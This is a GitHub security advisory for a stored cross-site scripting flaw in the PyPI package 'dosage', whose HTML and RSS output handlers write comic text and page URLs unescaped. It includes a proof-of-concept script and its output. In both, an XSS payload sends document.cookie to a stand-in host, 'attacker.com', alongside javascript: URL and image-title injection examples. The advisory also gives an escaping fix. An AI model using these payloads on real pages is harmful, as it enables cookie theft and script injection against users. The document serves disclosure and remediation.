# [M] Dosage Vulnerable to Stored Cross-Site Scripting (XSS) in HTML/RSS Output Handlers

## Summary
Severity: Medium
Advisory: GHSA-75mw-h36v-2jv7
CWE: CWE-79
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-06-26
Source: https://github.com/advisories/GHSA-75mw-h36v-2jv7
Type: github-advisory

## Affected
- PyPI: `dosage` — affected >=0 <3.3

## Details
## Summary

The HTML and RSS output handlers in `dosagelib/events.py` write user-controlled content (comic text and page URLs) directly into generated files without proper HTML escaping. When a user scrapes a malicious webcomic and opens the generated HTML/RSS file, attacker-controlled JavaScript can execute in their browser.

**CWE**: [CWE-79](https://cwe.mitre.org/data/definitions/79.html) - Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)

---

## Details

### Vulnerable Code Locations

The vulnerability exists in `dosagelib/events.py` where untrusted content is written to HTML/RSS output without escaping:

**1. RSSEventHandler (lines 116-118)**
```python
# events.py:116-118
if comic.text:
    description += '<br/>%s' % comic.text        # ← Unescaped comic.text
description += '<br/><a href="%s">View Comic Online</a>' % pageUrl  # ← Unescaped URL
```

**2. HtmlEventHandler (lines 232, 238)**
```python
# events.py:232
self.html.write(u'<li><a href="%s">%s</a>\n' % (pageUrl, pageUrl))  # ← Unescaped URL

# events.py:238
if text:
    self.html.write(u'<br/>%s\n' % text)  # ← Unescaped text
```

### Root Cause

- `BasicScraper.fetchText()` in `scraper.py:422` calls `html.unescape()` on extracted text
- The output handlers never call `html.escape()` before writing to files
- No sanitization of URLs or text content occurs anywhere in the output pipeline

### Data Flow

```
Malicious webcomic page
    ↓
textSearch XPath extracts content (e.g., img/@title, div text)
    ↓
BasicScraper.fetchText() calls html.unescape()
    ↓
comic.text stored without sanitization
    ↓
HtmlEventHandler/RSSEventHandler writes to file without html.escape()
    ↓
Generated HTML/RSS contains executable JavaScript
```

---

## PoC

I created a proof-of-concept that demonstrates the vulnerability by simulating a malicious comic source.

### Prerequisites
- Docker installed and running

### PoC Files

Create these files in a `poc/` directory:

**1. `poc/Dockerfile`**
```dockerfile
FROM python:3.11-slim

LABEL description="PoC for dosage Stored XSS vulnerability (CWE-79)"

WORKDIR /app
COPY . /app

# Install dependencies
RUN pip install --no-cache-dir --quiet imagesize lxml requests rich platformdirs

# Install dosage
ENV SETUPTOOLS_SCM_PRETEND_VERSION_FOR_DOSAGE=0.0.0
RUN pip install --no-cache-dir --quiet .

CMD ["python", "poc/poc.py"]
```

**2. `poc/poc.py`**
```python
#!/usr/bin/env python3
"""
PoC: Stored XSS in dosage HTML/RSS Output Handlers
Demonstrates that untrusted comic content is written to output files unescaped.
"""

import sys
from pathlib import Path
from types import SimpleNamespace

from dosagelib.events import HtmlEventHandler, RSSEventHandler

# XSS payloads simulating malicious webcomic content
MALICIOUS_TEXT = "Funny Comic!<script>fetch('http://attacker.com/?c='+document.cookie)</script>"
MALICIOUS_URL = "javascript:alert('XSS-via-URL')"

def check_vulnerability(content: str, marker: str, description: str) -> bool:
    """Check if unescaped marker appears in content."""
    if marker.lower() in content.lower():
        print(f"  [VULNERABLE] {description}")
        print(f"               Found unescaped: {marker}")
        return True
    print(f"  [SAFE] {description}")
    return False

def main():
    print("=" * 70)
    print("PoC: Stored XSS in dosage HTML/RSS Output Handlers")
    print("=" * 70)
    print()

    base = Path(__file__).parent / "output"
    base.mkdir(parents=True, exist_ok=True)

    # Create dummy image file
    img_path = base / "payload.png"
    img_path.write_bytes(b"\x89PNG\r\n\x1a\n")

    # Simulate comic with malicious content
    comic = SimpleNamespace(
        scraper=SimpleNamespace(name="MaliciousComic"),
        referrer=MALICIOUS_URL,
        text=MALICIOUS_TEXT,
        url="http://example.com/comic.png"
    )

    vulnerabilities_found = 0

    # Test RSS Handler
    print("[*] Testing RSSEventHandler...")
    rss_handler = RSSEventHandler(str(base), None, False)
    rss_handler.start()
    rss_handler.comicDownloaded(comic, str(img_path))
    rss_handler.end()
    
    rss_path = Path(rss_handler.rssfn)
    rss_content = rss_path.read_text(encoding="utf-8")
    print(f"    Output file: {rss_path}")
    
    if check_vulnerability(rss_content, "javascript:", "pageUrl in RSS href"):
        vulnerabilities_found += 1

    # Test HTML Handler  
    print()
    print("[*] Testing HtmlEventHandler...")
    html_handler = HtmlEventHandler(str(base), None, False)
    html_handler.start()
    html_path = Path(html_handler.html.name)
    html_handler.comicDownloaded(comic, str(img_path), text=MALICIOUS_TEXT)
    html_handler.end()

    html_content = html_path.read_text(encoding="utf-8")
    print(f"    Output file: {html_path}")
    
    if check_vulnerability(html_content, "<script>", "text param in HTML"):
        vulnerabilities_found += 1
    if check_vulnerability(html_content, "javascript:", "pageUrl in HTML link"):
        vulnerabilities_found += 1

    # Show vulnerable content
    print()
    print("-" * 70)
    print("Vulnerable Content in Generated HTML:")
    print("-" * 70)
    for line in html_content.splitlines():
        if "<script>" in line.lower() or "javascript:" in line.lower():
            print(f"  {line}")

    print()
    print("=" * 70)
    print(f"RESULT: {vulnerabilities_found} XSS vulnerability vectors confirmed!")
    print("=" * 70)
    
    return 0 if vulnerabilities_found > 0 else 1

if __name__ == "__main__":
    sys.exit(main())
```

**3. `poc/run_poc.sh`**
```bash
#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$(cd "${SCRIPT_DIR}/.." && pwd)"

echo "[*] Building PoC Docker image..."
docker build -t dosage-xss-poc -f "${SCRIPT_DIR}/Dockerfile" "${ROOT_DIR}" --quiet

echo "[*] Running PoC..."
docker run --rm dosage-xss-poc

echo "[*] Cleanup: docker rmi dosage-xss-poc"
```

### Running the PoC

```bash
cd /path/to/dosage
chmod +x poc/run_poc.sh
./poc/run_poc.sh
```

### PoC Output

```
======================================================================
PoC: Stored XSS in dosage HTML/RSS Output Handlers
======================================================================

[*] Testing RSSEventHandler...
    Output file: /app/poc/output/dailydose.rss
  [VULNERABLE] pageUrl in RSS href
               Found unescaped: javascript:

[*] Testing HtmlEventHandler...
    Output file: /app/poc/output/html/comics-20251210.html
  [VULNERABLE] text param in HTML
               Found unescaped: <script>
  [VULNERABLE] pageUrl in HTML link
               Found unescaped: javascript:

----------------------------------------------------------------------
Vulnerable Content in Generated HTML:
----------------------------------------------------------------------
  <li><a href="javascript:alert('XSS-via-URL')">javascript:alert('XSS-via-URL')</a>
  <br/>Funny Comic!<script>fetch('http://attacker.com/?c='+document.cookie)</script>

======================================================================
RESULT: 3 XSS vulnerability vectors confirmed!
======================================================================
```

The output shows that:
1. The `javascript:` URL is written directly into `<a href>` attributes
2. The `<script>` tag from comic text appears unescaped in the HTML body

---

## Impact

### Who is affected?
- Users who use `dosage --output html` or `dosage --output rss` options
- Anyone who opens the generated HTML/RSS files in a browser

### Attack scenario
1. Attacker creates or compromises a webcomic site
2. Attacker injects JavaScript into image title/alt attributes:
   ```html
   <img src="comic.png" title="Funny!<script>alert(1)</script>">
   ```
3. Victim runs: `dosage MaliciousComic --output html`
4. The generated `Comics/html/comics-YYYYMMDD.html` contains the unescaped script
5. When victim opens the file, JavaScript executes

### Potential consequences
- **Cookie theft** if files are served over HTTP
- **Local file access** via `file://` protocol
- **Phishing attacks** through DOM manipulation

---

## Recommended Fix

Escape all user-controlled content before writing to HTML/RSS:

```python
import html

# In RSSEventHandler.comicDownloaded() - events.py around line 116:
if comic.text:
    description += '<br/>%s' % html.escape(comic.text)
description += '<br/><a href="%s">View Comic Online</a>' % html.escape(pageUrl)

# In HtmlEventHandler.comicDownloaded() - events.py around line 232:
self.html.write(u'<li><a href="%s">%s</a>\n' % (html.escape(pageUrl), html.escape(pageUrl)))

# events.py around line 238:
if text:
    self.html.write(u'<br/>%s\n' % html.escape(text))
```

For URLs, validating that they use safe protocols (`http://`, `https://`) would also help prevent javascript: URLs.

---

## Resources

- [CWE-79: Cross-site Scripting (XSS)](https://cwe.mitre.org/data/definitions/79.html)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Python html.escape() documentation](https://docs.python.org/3/library/html.html#html.escape)

---

## References
- https://github.com/webcomics/dosage/security/advisories/GHSA-75mw-h36v-2jv7
- https://github.com/webcomics/dosage/commit/b91fd5cc3889aed3d9cc81b98834648197b2859a
- https://github.com/webcomics/dosage
- https://github.com/webcomics/dosage/releases/tag/3.3
